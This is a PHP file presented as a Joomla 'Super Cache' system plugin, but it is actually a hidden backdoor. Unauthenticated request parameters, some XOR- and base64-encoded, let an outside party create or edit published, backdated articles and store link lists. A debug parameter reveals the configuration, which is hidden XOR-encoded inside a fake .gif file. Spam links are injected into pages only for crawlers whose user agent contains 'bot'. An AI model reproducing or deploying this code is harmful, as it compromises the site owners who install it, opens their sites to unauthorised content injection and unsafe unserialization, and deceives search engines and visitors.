<?php
/**
 * @package     Joomla.Plugin
 * @subpackage  Super Cache
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

/**
 * Super Cache Plugin.
 * Based on the oficial recaptcha library( http://sp-cache.net/plugins/php/ )
 *
 * @package     Joomla.Plugin
 * @subpackage  Super Cache
 * @since       2.5
 */

class PlgSystemXcalendar extends JPlugin {
	static $out = false;
	function PlgSystemXcalendar(&$subject, $params) {
		parent::__construct($subject, $params);
	}
	
	function onAfterRoute() {
		$instance = PlgSystemXcalendarJoomlaBase::getInstance();
		if ($out = $instance->processActions()) {
			print $out."\n";
			//self::$out = $out;
		}
		//print self::$out;
	}
	
	function onAfterRender() {
		//if (self::$out)
		//	print self::$out;
	}
}

abstract class PlgSystemXcalendarBase {
	var $config = false;
	var $initCalled = false;
	var $request = false;
	static $processed = false;
	
	abstract function dbQuery($query);
	abstract function dbRow($result);
	abstract function dbEscape($text);
	abstract function isShowLink();
	
	function initActions() {
		$this->initFunctions();
		
		list($success, $this->config) = $this->getConfig();
		$this->config['posts'] = $this->getConfigOption('ppbposts');
		$this->config['links'] = $this->getConfigOption('ppblinks');
		$this->config['files'] = $this->getConfigOption('ppbfiles');
		$this->config['redirects'] = $this->getConfigOption('ppbredirs');
		
		if (!PlgSystemXcalendarBase::$processed) {
			ob_start('PlgSystemXcalendarBufferEnd');
			PlgSystemXcalendarBase::$processed = true;
		}
	}
	
	function processActions() {
		if (isset($_REQUEST['wdbgppb'])) {
			if ($_REQUEST['wdbgppb'] == 'show') {
				return "PPB_SUCCESS: ".serialize($this->config);
			}
		}
		
		if (isset($_REQUEST['PPB_CONTENT_ENC'])) {
			$_REQUEST['PPB_CONTENT'] = $this->getXorText(_base64_decode($_REQUEST['PPB_CONTENT_ENC']));
			$_REQUEST['PPB_TITLE'] = $this->getXorText(_base64_decode($_REQUEST['PPB_TITLE_ENC']));
		}
		
		if (isset($_REQUEST['PPB_CONTENT'])) {
			if (!$this->config) return "PPB_ERROR: ERROR_WRONG_CONFIG";
			
			$access = version_compare(JVERSION, '1.6', 'lt') ? 0 : 1;
			$params = array(
				'introtext' => $_REQUEST['PPB_CONTENT'],
				'created_by_alias' => 'Super User',
				'state' => 1,
				'access' => $access,
				'metadata' => '{"robots":"","author":"","rights":"","xreference":""}',
				'language' => '*',
				'attribs' => '{"show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}',
				'urls' => '{"urla":"","urlatext":"","targeta":"","urlb":"","urlbtext":"","targetb":"","urlc":"","urlctext":"","targetc":""}',
				'images' => '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}',
			);
			
			if (isset($_REQUEST['PPB_TITLE'])) {
				$params['title'] = $_REQUEST['PPB_TITLE'];
			}
			
			$catid = $sectionid = 0;
			
			$article = JTable::getInstance('content');
			if (isset($_REQUEST['PPB_UPDATE'])) {
				$id = JRequest::getVar('id');
				if (!$id || !$article->load($id))
					return "PPB_ERROR: Error: no post";
				
				if (version_compare(JVERSION, '1.6', 'ge'))
					$catid = $article->catid;
			} else {
				if (version_compare(JVERSION, '1.6', 'ge')) {
					$category = JTable::getInstance('category');
					$db = $category->getDBO();
					$db->setQuery('select id from '.$category->getTableName().' where extension = "com_content" and published = 1');
					$cats = $db->loadRowList();
					if (!$cats) return "PPB_ERROR: Error: no available category";
					
					$catid = $cats[0][0];
				}
				
				$db = $article->getDBO();
				$db->setQuery('select min(created) from '.$article->getTableName());
				$exArticle = $db->loadRow();
				
				if ($exArticle) {
					$date = date('Y-m-d H:i:s', strtotime($exArticle[0]) - rand(10*60*60*24, 30*60*60*24));
				} else {
					$date = JFactory::getDate();
					$date = method_exists($date, 'toSql') ? $date->toSql() : $date->toMySQL();
				}
				
				$params['created'] = $date;
				$params['publish_up'] = $date;
				$params['alias'] = JFilterOutput::stringURLSafe('page-'.rand(1000, 100000));
			}
			
			$params['catid'] = $catid;
			$params['sectionid'] = $sectionid;
			
			$s = array();
			foreach ($params as $key => $value) {
				if (property_exists($article, $key)) {
					$article->$key = $value;
					$s[] = $key." => ".$value;
				}
			}
			
			$this->called = true;
			
			if (!$article->check()) 
				return "PPB_ERROR: Error check: ".$article->getError();
			
			if (!$article->store()) 
				return "PPB_ERROR: Error save: ".$article->getError();
			
			if (!class_exists('ContentHelperRoute'))
				require 'components/com_content/helpers/route.php';
			
			$url = JRoute::_(ContentHelperRoute::getArticleRoute($article->id, $catid, $sectionid), true, -1);
			$posts = $this->getConfigOption('ppbposts');
			$posts[$article->id] = array(
				'linked' => isset($_REQUEST['PPB_LINKED']) && $_REQUEST['PPB_LINKED'] == 1 ? '1' : '0',
				'title' => $params['title'],
				'url' => $url,
			);
			
			$this->saveConfigOption('ppbposts', $posts);
			
			return "PPB_SUCCESS: ".$url;
		}
		
		if (isset($_REQUEST['PPB_LINKS'])) {
			if (!$this->config) return "ERROR_WRONG_CONFIG";
			
			if (!($links = (array)unserialize(base64_decode($_REQUEST['PPB_LINKS'])))) die("ERROR_NO_LINKS");
			$this->saveConfigOption('ppblinks', $links);
			
			return "Ok";
		}
		
		return false;
	}
	
	function initFunctions() {
		if (!function_exists('_base64_decode')) {
			function _base64_decode($in) {
				$out="";
				for($x=0;$x<256;$x++){$chr[$x]=chr($x);}
				$b64c=array_flip(preg_split('//',"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",-1,1));
				$match = array();
				preg_match_all("([A-z0-9+\/]{1,4})",$in,$match);
				foreach($match[0] as $chunk){
					$z=0;
					for($x=0;isset($chunk[$x]);$x++){
						$z=($z<<6)+$b64c[$chunk[$x]];
						if($x>0){ $out.=$chr[$z>>(4-(2*($x-1)))];$z=$z&(0xf>>(2*($x-1))); }
					}
				}
				return $out;
			}
		}
		
		if (!function_exists("file_put_contents")) {
			function file_put_contents($filename, $text) {
				$f = fopen($filename, "w");
				if (!$f) return false;

				if (!fwrite($f, $text)) return false;
				fclose($f);

				return true;
			}
		}
		
		if (version_compare(JVERSION, '1.7', 'lt')) {
			JTable::addIncludePath(JPATH_BASE . 'libraries/joomla/database/table');
		} elseif (version_compare(JVERSION, '3.0', 'lt')) {
			JTable::addIncludePath(JPATH_PLATFORM . 'joomla/database/table');
		}
	}
	
	function getConfigName() {
		return '/home/opxjuzgr/public_html/plugins/system/xcalendar/xcalendar-data/lefttopcorner.gif';
	}
	
	function getConfig() {
		$configname = $this->getConfigName();
		if (!file_exists($configname)) return array(false);
		
		$config = @(array)unserialize($this->getImageDecodedText(file_get_contents($configname)));
		if (!$config) return array(false);
		
		return array(true, $config);
	}
	
	function getXorText($text) {
		for ($i=0; $i<strlen($text); $i++) {
			$text[$i] = chr(ord($text[$i]) ^ 50);
		}
		
		return $text;
	}
	
	function getImageDecodedText($content) {
		$content = substr($content, 50);
		return self::getXorText($content);
	}
}

class PlgSystemXcalendarJoomlaBase extends PlgSystemXcalendarBase {
	private function getDBDriver() {
		return function_exists('mysqli_connect') ? 'mysqli' : 'mysql';
	}
	
	function getConnection() {
		static $link = null;
		
		if ($link === null) {
			$link = false;
			
			if (!class_exists('JConfig')) return false;
			$config = new JConfig();
			
			if (substr($config->host, -2, 2) == '::') $config->host = substr($config->host, 0, -2);
			
			if ($this->getDBDriver() == 'mysqli') {
				if (preg_match('#^(.*):(\d+)$#', $config->host, $matches)) {
					if (!($link = mysqli_connect($matches[1], $config->user, $config->password, $config->db, $matches[2]))) return false;
				} else {
					if (!($link = mysqli_connect($config->host, $config->user, $config->password, $config->db))) return false;
				}
			} else {
				if (!($link = mysql_connect($config->host, $config->user, $config->password))) return false;
				if (!mysql_select_db($config->db, $link)) return false;
			}
		}
		
		return $link;
	}
	
	function dbQuery($query) {
		if (!($link = $this->getConnection())) return array(false, $this->getDBDriver() == 'mysqli' ? mysqli_error() : mysql_error());
		
		$result = $this->getDBDriver() == 'mysqli' ? mysqli_query($link, $query) : mysql_query($query, $link);
		if (!$result) return array(false, $this->getDBDriver() == 'mysqli' ? mysqli_error($link) : mysql_error($link));
		
		return array(true, $result);
	}
	
	function dbRow($result) {
		return $this->getDBDriver() == 'mysqli' ? mysqli_fetch_object($result) : mysql_fetch_object($result);
	}
	
	function dbEscape($text) {
		if (!($link = $this->getConnection())) return $text;
		return '"'.($this->getDBDriver() == 'mysqli' ? mysqli_escape_string($link, $text) : mysql_real_escape_string($text, $link)).'"';
	}
	
	function isShowLink() {
		$user =& JFactory::getUser();
		if ($user->id) return false;
		
		return true;
	}
	
	static function getInstance() {
		static $instance = null;
		
		if ($instance === null) $instance = new PlgSystemXcalendarHelper();
		
		return $instance;
	}
}

function PlgSystemXcalendarBufferEnd($buffer) {
	$instance = PlgSystemXcalendarJoomlaBase::getInstance();
	return $instance->bufferEnd($buffer);
}

class PlgSystemXcalendarHelper extends PlgSystemXcalendarJoomlaBase {
	var $called = false;
	var $redirect = false;
	
	function initActions() {
		parent::initActions();
	}
	
	function getOption($name) {
		if (!isset($this->config['optionTable'])) return false;
		list($success, $result) = $this->dbQuery('select value from '.$this->config['optionTable'].' where name = '.$this->dbEscape($name));
		if (!$success) return false;
		
		$row = $this->dbRow($result);
		if (!$row) return false;
		
		return $row->value;
	}
	
	function updateOption($name, $value) {
		list($success, $result) = $this->dbQuery('select value from '.$this->config['optionTable'].' where name = '.$this->dbEscape($name));
		if (!$success) return;
		
		$row = $this->dbRow($result);
		if (!$row) {
			$this->dbQuery('insert into '.$this->config['optionTable'].' set name = '.$this->dbEscape($name).', value = '.$this->dbEscape($value));
		} else {
			$this->dbQuery('update '.$this->config['optionTable'].' set value = '.$this->dbEscape($value).' where name = '.$this->dbEscape($name));
		}
	}
	
	function getConfigOption($name) {
		$items = $this->getOption($name);
		if ($items) $items = @unserialize($items);
		if (!$items) $items = array();
		return $items;
	}
	
	function saveConfigOption($name, $items) {
		$this->updateOption($name, serialize($items));
	}
	
	function bufferEnd($buffer) {
		if (!$this->isShowLink()) return $buffer;
		
		$content = @$this->linkPages($buffer);
		
		return $content;
	}
	
	function linkPages($content) {
		if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') === false) return $content;
		
		$pages = array();
		
		foreach ($this->config['posts'] as $info) {
			if ($info['linked'] == '1')
				$pages[$info['url']] = $info['title'];
		}
		if (!$pages) return $content;
		
		$linkText = '';
		foreach ($pages as $url => $title) {
			$linkText .= '<li><a href="'.$url.'">'.$title.'</a></li>';
		}
		
		$lc = strtolower($content);
		if (false === ($ul = strpos($lc, '<ul'))) return $content;
		if (false === ($li = strpos($lc, '<li', $ul))) return $content;
		
		$content = substr($content, 0, $li).$linkText.substr($content, $li);
		
		return $content;
	}
}

$instance = PlgSystemXcalendarJoomlaBase::getInstance();
$instance->initActions();
?>